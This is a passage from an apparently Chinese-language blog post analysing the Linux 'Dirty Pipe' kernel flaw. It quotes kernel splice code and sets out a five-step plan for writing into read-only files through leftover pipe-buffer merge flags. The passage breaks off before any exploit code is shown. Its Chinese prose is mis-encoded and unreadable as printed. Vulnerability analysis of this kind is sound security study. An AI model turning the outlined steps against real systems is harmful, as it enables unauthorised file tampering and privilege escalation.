class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Splice contents of ipipe to opipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">splice_pipe_to_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *ipipe,</span><br><span class="hljs-params">			       <span class="hljs-keyword">struct</span> pipe_inode_info *opipe,</span><br><span class="hljs-params">			       <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">ibuf</span>, *<span class="hljs-title">obuf</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head, o_head;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_tail, o_tail;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_mask, o_mask;<br>	<span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">bool</span> input_wakeup = <span class="hljs-literal">false</span>;<br><br><br>retry:<br>	ret = ipipe_prep(ipipe, flags);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br><br>	ret = opipe_prep(opipe, flags);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Potential ABBA deadlock, work around it by ordering lock</span><br><span class="hljs-comment">	 * grabbing by pipe info address. Otherwise two different processes</span><br><span class="hljs-comment">	 * could deadlock (one doing tee from A -&gt; B, the other from B -&gt; A).</span><br><span class="hljs-comment">	 */</span><br>	pipe_double_lock(ipipe, opipe);<br><br>	i_tail = ipipe-&gt;tail;<br>	i_mask = ipipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>	o_head = opipe-&gt;head;<br>	o_mask = opipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br>	<span class="hljs-keyword">do</span> &#123;<br>		<span class="hljs-type">size_t</span> o_len;<br><br>		<span class="hljs-keyword">if</span> (!opipe-&gt;readers) &#123;<br>			send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>			<span class="hljs-keyword">if</span> (!ret)<br>				ret = -EPIPE;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		i_head = ipipe-&gt;head;<br>		o_tail = opipe-&gt;tail;<br><br>		<span class="hljs-keyword">if</span> (pipe_empty(i_head, i_tail) &amp;&amp; !ipipe-&gt;writers)<br>			<span class="hljs-keyword">break</span>;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Cannot make any progress, because either the input</span><br><span class="hljs-comment">		 * pipe is empty or the output pipe is full.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (pipe_empty(i_head, i_tail) ||<br>		    pipe_full(o_head, o_tail, opipe-&gt;max_usage)) &#123;<br>			<span class="hljs-comment">/* Already processed some buffers, break */</span><br>			<span class="hljs-keyword">if</span> (ret)<br>				<span class="hljs-keyword">break</span>;<br><br>			<span class="hljs-keyword">if</span> (flags &amp; SPLICE_F_NONBLOCK) &#123;<br>				ret = -EAGAIN;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * We raced with another reader/writer and haven&#x27;t</span><br><span class="hljs-comment">			 * managed to process any buffers.  A zero return</span><br><span class="hljs-comment">			 * value means EOF, so retry instead.</span><br><span class="hljs-comment">			 */</span><br>			pipe_unlock(ipipe);<br>			pipe_unlock(opipe);<br>			<span class="hljs-keyword">goto</span> retry;<br>		&#125;<br><br>		ibuf = &amp;ipipe-&gt;bufs[i_tail &amp; i_mask];<br>		obuf = &amp;opipe-&gt;bufs[o_head &amp; o_mask];<br><br>		<span class="hljs-keyword">if</span> (len &gt;= ibuf-&gt;len) &#123;<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Simply move the whole buffer from ipipe to opipe</span><br><span class="hljs-comment">			 */</span><br>			*obuf = *ibuf;<br>			ibuf-&gt;ops = <span class="hljs-literal">NULL</span>;<br>			i_tail++;<br>			ipipe-&gt;tail = i_tail;<br>			input_wakeup = <span class="hljs-literal">true</span>;<br>			o_len = obuf-&gt;len;<br>			o_head++;<br>			opipe-&gt;head = o_head;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Get a reference to this pipe buffer,</span><br><span class="hljs-comment">			 * so we can copy the contents over.</span><br><span class="hljs-comment">			 */</span><br>			<span class="hljs-keyword">if</span> (!pipe_buf_get(ipipe, ibuf)) &#123;<br>				<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>					ret = -EFAULT;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			*obuf = *ibuf;<br><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Don&#x27;t inherit the gift and merge flags, we need to</span><br><span class="hljs-comment">			 * prevent multiple steals of this page.</span><br><span class="hljs-comment">			 */</span><br>			obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_GIFT;<br>			obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_CAN_MERGE;<br><br>			obuf-&gt;len = len;<br>			ibuf-&gt;offset += len;<br>			ibuf-&gt;len -= len;<br>			o_len = len;<br>			o_head++;<br>			opipe-&gt;head = o_head;<br>		&#125;<br>		ret += o_len;<br>		len -= o_len;<br>	&#125; <span class="hljs-keyword">while</span> (len);<br><br>	pipe_unlock(ipipe);<br>	pipe_unlock(opipe);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If we put data in the output pipe, wakeup any potential readers.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>		wakeup_pipe_readers(opipe);<br><br>	<span class="hljs-keyword">if</span> (input_wakeup)<br>		wakeup_pipe_writers(ipipe);<br><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="æ–‡ä»¶-ç®¡é“"><a href="#æ–‡ä»¶-ç®¡é“" class="headerlink" title="æ–‡ä»¶-&gt;ç®¡é“"></a>æ–‡ä»¶-&gt;ç®¡é“</h3><h4 id="do-splice-to"><a href="#do-splice-to" class="headerlink" title="do_splice_to"></a>do_splice_to</h4><p>åœ¨ <code>do_splice_to</code> ä¸­æœ€ç»ˆä¼šè°ƒç”¨åˆ°å†…æ ¸æ–‡ä»¶ç»“æ„ä½“å‡½æ•°è¡¨çš„ <code>splice_read</code> æŒ‡é’ˆï¼Œå¯¹äºä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿè€Œè¨€è¯¥å‡½æ•°æŒ‡é’ˆä¸åŒï¼Œä»¥ ext4 æ–‡ä»¶ç³»ç»Ÿä¸ºä¾‹ï¼ŒæŸ¥è¡¨ <code>ext4_file_operations</code>ï¼Œå¯¹åº”è°ƒç”¨çš„å‡½æ•°åº”ä¸º <code>generic_file_splice_read</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from a file to a pipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_to</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> *ppos,</span><br><span class="hljs-params">			 <span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">size_t</span> len,</span><br><span class="hljs-params">			 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ)))<br>		<span class="hljs-keyword">return</span> -EBADF;<br>	<span class="hljs-comment">//éªŒè¯æºæ–‡ä»¶æ˜¯å¦å…·æœ‰è¯»å– len å­—èŠ‚æ•°æ®çš„æƒé™</span><br>	ret = rw_verify_area(READ, in, ppos, len);<br>	<span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br>		<span class="hljs-keyword">return</span> ret;<br><br>	<span class="hljs-keyword">if</span> (unlikely(len &gt; MAX_RW_COUNT))<br>		len = MAX_RW_COUNT;<br><br>	<span class="hljs-keyword">if</span> (in-&gt;f_op-&gt;splice_read)<br>		<span class="hljs-keyword">return</span> in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);<br>	<span class="hljs-keyword">return</span> default_file_splice_read(in, ppos, pipe, len, flags);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="generic-file-splice-read"><a href="#generic-file-splice-read" class="headerlink" title="generic_file_splice_read"></a>generic_file_splice_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">generic_file_splice_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> *ppos,</span><br><span class="hljs-params">				 <span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">size_t</span> len,</span><br><span class="hljs-params">				 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">to</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head;<br>	<span class="hljs-type">int</span> ret;<br>	<span class="hljs-comment">//åˆå§‹åŒ– to è¿­ä»£å™¨ï¼Œå°†ç®¡é“çš„è¯»æ“ä½œè®¾ç½®åˆ° to è¿­ä»£å™¨ä¸­ï¼ŒåŒæ—¶è®¾ç½®ç¼“å†²åŒºé•¿åº¦ä¸º len</span><br>	iov_iter_pipe(&amp;to, READ, pipe, len);<br>	i_head = to.head;<br>    <span class="hljs-comment">//åˆå§‹åŒ– kiocb å¼‚æ­¥I/Oæ§åˆ¶å—ï¼Œä½¿ç”¨ç»™å®šçš„æ–‡ä»¶æŒ‡é’ˆ in</span><br>	init_sync_kiocb(&amp;kiocb, in);<br>	kiocb.ki_pos = *ppos;<br>    <br>    <span class="hljs-comment">//è°ƒç”¨ call_read_iter å‡½æ•°ï¼Œä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®åˆ°ç®¡é“ã€‚è¿™é‡Œå®é™…ä¸Šæ˜¯è°ƒç”¨äº†æ–‡ä»¶çš„ read_iter æ“ä½œï¼Œå¹¶å°†è¯»å–çš„æ•°æ®å†™å…¥åˆ°ç®¡é“ä¸­ã€‚</span><br>	ret = call_read_iter(in, &amp;kiocb, &amp;to);<br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>		*ppos = kiocb.ki_pos;<br>		file_accessed(in);<br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>		to.head = i_head;<br>		to.iov_offset = <span class="hljs-number">0</span>;<br>		iov_iter_advance(&amp;to, <span class="hljs-number">0</span>); <span class="hljs-comment">/* to free what was emitted */</span><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * callers of -&gt;splice_read() expect -EAGAIN on</span><br><span class="hljs-comment">		 * &quot;can&#x27;t put anything in there&quot;, rather than -EFAULT.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (ret == -EFAULT)<br>			ret = -EAGAIN;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨ext4æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œread_iterå…¶å®ä¸º<code>shmem_file_read_iter</code>ï¼Œè¿™Bå‡½æ•°è°ƒç”¨é“¾æœ‰ç‚¹å°é•¿ï¼Œè´´ä¸ªè°ƒç”¨é“¾å…ˆ</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">shmem_file_read_iter<br>	shmem_getpageï¼›æ ¹æ®æ–‡ä»¶ç´¢å¼•è·å–é¡µæ¡†<br>	copy_page_to_iterï¼›å°†é¡µæ¡†æ•°æ®å¤åˆ¶åˆ°ç›®æ ‡ç¼“å†²åŒºä¸­<br>		<span class="hljs-built_in">copy_page_to_iter_pipe</span>()ï¼›å¦‚æœç›®æ ‡ç¼“å†²åŒºæ˜¯ç®¡é“è¿­ä»£å™¨ï¼Œå°†æ•°æ®å¤åˆ¶åˆ°ç®¡é“ç¼“å†²åŒºä¸­<br></code></pre></td></tr></table></figure>

<h4 id="copy-page-to-iter-pipe"><a href="#copy-page-to-iter-pipe" class="headerlink" title="copy_page_to_iter_pipe"></a>copy_page_to_iter_pipe</h4><p>æœ€ç»ˆåœ¨ <code>copy_page_to_iter_pipe()</code> ä¸­ï¼Œå°†å¯¹åº”çš„ <code>pipe_buffer-&gt;page</code> è®¾ä¸º<strong>æ–‡ä»¶æ˜ å°„çš„é¡µé¢é›†çš„å¯¹åº”é¡µæ¡†</strong>ï¼Œå°†é¡µæ¡†å¼•ç”¨è®¡æ•° + 1ï¼ˆ<code>get_page()</code>ï¼‰ï¼Œè¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ª<strong>ä»æ–‡ä»¶è¯»å–æ•°æ®åˆ°ç®¡é“çš„è¿‡ç¨‹</strong>ï¼Œå› ä¸ºæ˜¯ç›´æ¥å»ºç«‹é¡µé¢çš„æ˜ å°„ï¼Œæ‰€ä»¥æ¯æ¬¡æ“ä½œåéƒ½ä¼šå°† <code>head +1</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params">			 <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br>	<span class="hljs-type">size_t</span> off;<br><br>	<span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br>		bytes = i-&gt;count;<br><br>	<span class="hljs-keyword">if</span> (unlikely(!bytes))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	<span class="hljs-keyword">if</span> (!sanity(i))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>	<span class="hljs-comment">//offæ˜¯NULLåº”è¯¥ğŸ¤”</span><br>	off = i-&gt;iov_offset;<br>	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>	<span class="hljs-keyword">if</span> (off) &#123;<br>		<span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br>			<span class="hljs-comment">/* merge with the last one */</span><br>			buf-&gt;len += bytes;<br>			i-&gt;iov_offset += bytes;<br>			<span class="hljs-keyword">goto</span> out;<br>		&#125;<br>		i_head++;<br>		buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>	&#125;<br>	<span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>	get_page(page);<br>	buf-&gt;page = page;<br>	buf-&gt;offset = offset;<br>	buf-&gt;len = bytes;<br><br>	pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>	i-&gt;iov_offset = offset + bytes;<br>	i-&gt;head = i_head;<br>out:<br>	i-&gt;count -= bytes;<br>	<span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>PSï¼šæ­¤å¤„å¹¶æ²¡æœ‰å¯¹pipe_buffer-&gt;flagsçš„è®¾ç½®æ“ä½œ</strong></p>
<h3 id="ç®¡é“-æ–‡ä»¶"><a href="#ç®¡é“-æ–‡ä»¶" class="headerlink" title="ç®¡é“-&gt;æ–‡ä»¶"></a>ç®¡é“-&gt;æ–‡ä»¶</h3><h4 id="do-splice-from"><a href="#do-splice-from" class="headerlink" title="do_splice_from"></a>do_splice_from</h4><p><code>do_splice_from</code> æœ€ç»ˆä¼šæ ¹æ®æ‰€æ“ä½œçš„æ–‡ä»¶çš„å±æ€§è°ƒç”¨ç›¸åº”çš„å†…æ ¸æ–‡ä»¶ç»“æ„ä¸­çš„ <code>splice_write()</code> å‡½æ•°æŒ‡é’ˆã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from pipe to file.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_from</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-keyword">struct</span> file *out,</span><br><span class="hljs-params">			   <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-keyword">if</span> (out-&gt;f_op-&gt;splice_write)<br>		<span class="hljs-keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);<br>	<span class="hljs-keyword">return</span> default_file_splice_write(pipe, out, ppos, len, flags);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="iter-file-splice-write"><a href="#iter-file-splice-write" class="headerlink" title="iter_file_splice_write"></a>iter_file_splice_write</h4><p>åœ¨<strong>ext4</strong>æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªå‡½æ•°æŒ‡é’ˆæ˜¯<code>iter_file_splice_write</code>ï¼Œæœ€ç»ˆä¼šè°ƒç”¨å¦‚ä¸‹å‡½æ•°</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">iter_file_splice_write<br>	splice_from_pipe_next <span class="hljs-comment">;æ£€æŸ¥ç®¡é“å¯ç”¨æ€§</span><br>	vfs_iter_write <span class="hljs-comment">;å°†è¯»å–çš„æ•°æ®å†™å…¥ç›®æ ‡æ–‡ä»¶</span><br>		do_iter_write<br>			do_iter_readv_writev<br>				 call_write_iter<br>				 	generic_file_write_iter <span class="hljs-comment">;åé¢è¿˜æœ‰ï¼Œä½†åº”è¯¥å°±æ˜¯æ™®é€šçš„æ‹·è´æ•°æ®ä¹‹ç±»çš„</span><br></code></pre></td></tr></table></figure>



<h1 id="0x03ï¼šæ¼æ´åˆ†æ"><a href="#0x03ï¼šæ¼æ´åˆ†æ" class="headerlink" title="0x03ï¼šæ¼æ´åˆ†æ"></a>0x03ï¼šæ¼æ´åˆ†æ</h1><p>æˆ‘ä»¬ç°åœ¨çŸ¥é“ä»¥ä¸‹å‡ ç‚¹</p>
<ul>
<li><strong>PIPE_BUF_FLAG_CAN_MERGE</strong>æ˜¯<code>pipe_buffer-&gt;page</code>æ˜¯å¦èƒ½å†™å…¥çš„æ ‡å¿—</li>
<li><code>pipe_write</code>ä¸­ä¼šå°†<code>pipe_buffer-&gt;flags</code>è®¾ç½®æˆ<strong>PIPE_BUF_FLAG_CAN_MERGE</strong></li>
<li><code>pipe_read</code>ä¸­è¯»å–å®Œæˆå<code>free</code>è¿™äº›<code>page</code>å¹¶ä¸ä¼šæŠŠ<code>flags</code>ç½®0</li>
<li>ä»æ–‡ä»¶å¤åˆ¶åˆ°ç®¡é“ä¸­<code>copy_page_to_iter_pipe</code>ä¸­<code>get_page</code>ä¸ä¼šé‡æ–°è®¾ç½®<code>flags</code>ï¼Œå› æ­¤æ­¤æ—¶<code>pipe_buffer</code>æŒ‡å‘çš„<code>page</code>æ˜¯ç›®æ ‡æ–‡ä»¶æ˜ å°„çš„<code>page</code>ï¼Œ<code>pipe_buffer-&gt;flags</code> &amp;&amp; <strong>PIPE_BUF_FLAG_CAN_MERGE</strong> &#x3D;&#x3D; <code>true</code>ï¼Œè¡¨ç¤ºæ­¤æ—¶å¯¹è¿™ä¸ª<code>page</code>æ‹¥æœ‰å†™å…¥æƒé™äº†ã€‚è¿™å°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬æ‰“å¼€çš„æ˜¯ä¸€ä¸ªåªæœ‰åªè¯»æƒé™çš„æ–‡ä»¶ï¼Œç°åœ¨å¯ä»¥è¶Šæƒå†™å…¥</li>
</ul>
<p>äºæ˜¯æœ‰äº†è¿™æ ·ä¸€ä¸ªæ€è·¯</p>
<ul>
<li>step â… ï¼šåˆ›å»ºä¸€ä¸ª<code>pipe</code></li>
<li>step â…¡ï¼šæŠŠ<code>pipe</code>å†™æ»¡ï¼Œä½¿æ‰€æœ‰pipe_buffer-&gt;flagséƒ½è¢«è®¾ç½®ä¸Š<strong>PIPE_BUF_FLAG_CAN_MERGE</strong></li>
<li>step â…¢ï¼šè¯»å–<code>pipe</code>ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œæ¸…ç©º<code>pipe</code></li>
<li>step â…£ï¼šæ‰“å¼€ç›®æ ‡æ–‡ä»¶ï¼Œåˆ©ç”¨<code>splice</code>å°†å†…å®¹ä»æ–‡ä»¶æ‹·è´åˆ°ç®¡é“ï¼Œæ­¤æ—¶<code>pipe_buffer-&gt;page</code>ä¸ºæ–‡ä»¶åœ¨å†…å­˜ä¸­çš„æ˜ å°„é¡µæ¡†ï¼Œ<code>pipe_buffer-&gt;flags</code>ä¿ç•™æœ‰ä¹‹å‰è®¾ç½®çš„<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>ï¼Œæ­¤æ—¶åœ¨ç®¡é“ä¸­å¯¹è¯¥æ–‡ä»¶å…·æœ‰å†™å…¥æƒé™ã€‚<code>pipe head</code> +1</li>
<li>step â…¤ï¼šåˆ©ç”¨<code>write</code>å‘ç®¡é“ä¸­å†™å…¥æ¶æ„æ•°æ®ï¼Œå› ä¸ºä¸Šä¸€ä¸ª <code>pipe_buffer</code> æ²¡æœ‰å†™æ»¡ï¼Œä»è€Œå°†æ•°æ®æ‹·è´åˆ°ä¸Šä¸€ä¸ª <code>pipe_buffer</code> å¯¹åº”çš„é¡µé¢â€”â€”å³æ–‡ä»¶æ˜ å°„çš„é¡µé¢ã€‚å®Œæˆè¶Šæƒå†™å…¥</li>
</ul>
<h1 id="0x04ï¼šæ¼æ´åˆ©ç”¨"><a href="#0x04ï¼šæ¼æ´åˆ©ç”¨" class="headerlink" title="0x04ï¼šæ¼æ´åˆ©ç”¨"></a>0x04ï¼šæ¼æ´åˆ©ç”¨</h1><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>ç»è¿‡ä¸Šè¿°åˆ†æåˆ©ç”¨demoå°±å¾ˆå¥½å†™äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 